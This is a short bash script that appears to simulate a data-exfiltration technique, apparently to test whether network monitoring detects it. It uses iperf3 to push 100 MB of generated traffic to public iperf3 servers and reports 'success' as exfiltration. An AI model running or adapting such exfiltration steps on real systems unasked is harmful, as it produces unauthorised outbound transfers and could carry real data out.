#!/bin/bash

# define colors
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
RESET="\e[0m"

# data exfiltration technique simulation
echo -e "\n${YELLOW}>>> [Exfiltration] Automated Exfiltration Technique ${RESET}"
echo "Let's simulate the case when an attacker exfiltrates data"

echo "Trying to exfiltrate 100 MB of data using iPerf3 tool (up to 3 minutes) ... "

TIMEOUT=90

if ! timeout $TIMEOUT iperf3 -c iperf3.moji.fr -n 100M >> /dev/null 2>&1; then
    if ! timeout $TIMEOUT iperf3 -c nl.iperf.014.fr -n 100M >> /dev/null 2>&1; then
        echo -e "${RED}Error! Data exfiltration failed. Check iPerf3 servers ${RESET}"
    else 
        echo -e "${GREEN}Success! Data exfiltration to the server nl.iperf.014.fr was done ${RESET}"
    fi
else
    echo -e "${GREEN}Success! Data exfiltration to the server iperf3.moji.fr was done ${RESET}"
fi
